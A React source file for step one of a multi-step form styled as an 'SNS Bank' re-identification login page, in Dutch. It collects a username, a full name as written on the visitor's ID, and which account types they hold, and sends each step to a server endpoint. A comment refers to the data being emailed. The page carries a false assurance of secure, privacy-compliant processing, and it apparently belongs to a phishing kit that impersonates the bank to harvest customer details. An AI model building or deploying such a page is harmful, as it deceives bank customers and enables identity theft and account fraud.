import { useLocation } from 'wouter';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { useFormStore } from '@/hooks/use-form-store';
import { useTranslation } from '@/lib/translations';
import { User, Shield, KeyRound } from 'lucide-react';

const step1Schema = z.object({
  username: z.string().min(1, "Gebruikersnaam is verplicht"),
  fullName: z.string().min(1, "Volledige naam is verplicht"),
  accountTypes: z.array(z.enum(["private", "business", "creditcard"])).min(1, "Selecteer minimaal één rekeningtype"),
});

type Step1Data = z.infer<typeof step1Schema>;

export default function Step1() {
  const [, setLocation] = useLocation();
  const { formData, updateFormData, setCurrentStep, isEnglish } = useFormStore();
  const t = useTranslation(isEnglish);

  const form = useForm<Step1Data>({
    resolver: zodResolver(step1Schema),
    defaultValues: {
      username: formData.username || '',
      fullName: formData.fullName || '',
      accountTypes: formData.accountTypes || [],
    },
  });

  const onSubmit = async (data: Step1Data) => {
    try {
      // Send step data to server
      const response = await fetch('/api/step-submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, step: 1 }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit step data');
      }

      // Update local store and proceed
      updateFormData(data);
      setCurrentStep(1);
      setLocation('/step-2');
    } catch (error) {
      console.error('Step 1 submission error:', error);
      // Still proceed locally even if email fails
      updateFormData(data);
      setCurrentStep(1);
      setLocation('/step-2');
    }
  };

  const handleBack = () => {
    setLocation('/');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-orange-50">
      {/* SNS Header */}
      <div className="bg-primary text-white py-4">
        <div className="max-w-2xl mx-auto px-4 sm:px-6">
          <div className="flex items-center gap-3">
            <Shield className="h-8 w-8" />
            <div>
              <h1 className="text-xl sm:text-2xl font-bold" data-testid="sns-logo">SNS Bank</h1>
              <p className="text-orange-100 text-sm">Veilig inloggen voor re-identificatie</p>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-lg mx-auto px-4 sm:px-6 py-8 sm:py-12">
        <Card className="shadow-2xl border-0">
          <CardContent className="pt-8 pb-8">
            <div className="text-center mb-8">
              <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto mb-4">
                <User className="h-8 w-8 text-white" />
              </div>
              <h2 className="text-2xl font-bold text-secondary mb-2" data-testid="step-title">
                Inloggen bij SNS
              </h2>
              <p className="text-muted-foreground text-sm">
                Voer je gegevens in voor verificatie
              </p>
            </div>

            {/* Login Method Info */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <div className="flex items-center gap-3">
                <KeyRound className="h-5 w-5 text-blue-600" />
                <div>
                  <p className="text-blue-900 font-medium text-sm">Gebruikersnaam + Volledige naam</p>
                  <p className="text-blue-700 text-xs">Voor veilige verificatie van je identiteit</p>
                </div>
              </div>
            </div>
            
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <FormField
                  control={form.control}
                  name="username"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-secondary font-medium" data-testid="label-username">
                        Gebruikersnaam
                      </FormLabel>
                      <FormControl>
                        <Input 
                          placeholder="Voer je gebruikersnaam in" 
                          {...field} 
                          data-testid="input-username"
                          className="h-12 text-lg border-2 focus:border-primary"
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="fullName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-secondary font-medium" data-testid="label-fullname">
                        Volledige naam
                      </FormLabel>
                      <FormControl>
                        <Input 
                          placeholder="Voer je volledige naam in" 
                          {...field} 
                          data-testid="input-fullname"
                          className="h-12 text-lg border-2 focus:border-primary"
                        />
                      </FormControl>
                      <FormMessage />
                      <p className="text-xs text-muted-foreground">
                        Voer je naam in zoals deze op je identiteitsbewijs staat
                      </p>
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="accountTypes"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-secondary font-medium" data-testid="label-accounttypes">
                        Rekeningtypes bij SNS Bank
                      </FormLabel>
                      <div className="grid gap-3 mt-3">
                        {[
                          { value: 'private', label: 'Particuliere rekening', desc: 'Persoonlijke betaal- en spaarrekening' },
                          { value: 'business', label: 'Zakelijke rekening', desc: 'Bedrijfsrekening en zakelijke diensten' },
                          { value: 'creditcard', label: 'Creditcard', desc: 'SNS Creditcard en gerelateerde producten' }
                        ].map((type) => (
                          <div key={type.value} className="checkbox-item">
                            <Checkbox
                              id={type.value}
                              checked={field.value?.includes(type.value as any)}
                              onCheckedChange={(checked) => {
                                const updatedTypes = checked
                                  ? [...(field.value || []), type.value]
                                  : field.value?.filter((t) => t !== type.value) || [];
                                field.onChange(updatedTypes);
                              }}
                              data-testid={`checkbox-${type.value}`}
                              className="mr-3"
                            />
                            <div className="flex-1">
                              <label
                                htmlFor={type.value}
                                className="text-sm font-medium cursor-pointer"
                                data-testid={`label-${type.value}`}
                              >
                                {type.label}
                              </label>
                              <p className="text-xs text-muted-foreground">{type.desc}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <div className="flex flex-col gap-3 mt-8">
                  <Button 
                    type="submit"
                    className="w-full bg-primary hover:bg-orange-600 text-white h-12 text-lg font-semibold rounded-lg shadow-md"
                    data-testid="button-next"
                  >
                    Volgende stap
                  </Button>
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleBack}
                    data-testid="button-back"
                    className="w-full h-12 border-2 border-gray-300 hover:border-primary"
                  >
                    Terug naar hoofdpagina
                  </Button>
                </div>
              </form>
            </Form>

            {/* Security Notice */}
            <div className="mt-6 p-4 bg-gray-50 rounded-lg border">
              <div className="flex items-start gap-2">
                <Shield className="h-4 w-4 text-gray-600 mt-0.5 flex-shrink-0" />
                <div>
                  <p className="text-xs text-gray-700">
                    <strong>Veiligheid:</strong> Dit is een beveiligde verbinding. Je gegevens worden veilig verwerkt conform de privacy-wetgeving.
                  </p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
